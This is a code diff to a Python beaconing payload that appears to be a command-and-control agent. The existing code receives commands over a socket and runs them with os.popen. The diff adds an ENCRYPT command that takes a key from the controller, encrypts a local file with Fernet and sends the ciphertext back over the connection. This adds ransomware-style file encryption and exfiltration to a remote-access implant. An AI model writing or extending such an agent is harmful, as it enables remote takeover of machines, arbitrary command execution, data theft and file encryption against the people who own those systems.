@@ -3,6 +3,7 @@ import time
 import os
 import random
 import base64
+from cryptography.fernet import Fernet
 
 # Stageless Beaconing Payload (contains full Agent)
 
@@ -37,6 +38,29 @@ while(Loop):
             command = "ping -t 8.8.8.8"
             os.system(command)
             Loop = False
+        elif received == "ENCRYPT":
+            received = str(sock.recv(2048), "utf-8")
+            received = base64.b64decode(received).decode("utf-8")
+
+            # using the generated key
+            fernet = Fernet(received.encode("utf-8"))
+
+            # opening the original file to encrypt
+            with open('test.txt', 'rb') as file:
+                original = file.read()
+
+            # encrypting the file
+            encrypted = fernet.encrypt(original)
+
+            # Sending the encrypted file
+            sock.sendall(bytes(encrypted.decode("utf-8"), "utf-8"))
+
+            # writing the encrypted file
+            with open('test_client_encrypted.txt', 'wb') as encrypted_file:
+                encrypted_file.write(encrypted)
+                
+
+
         else:
             # run the command and save the output
             c2command = os.popen(received).read()
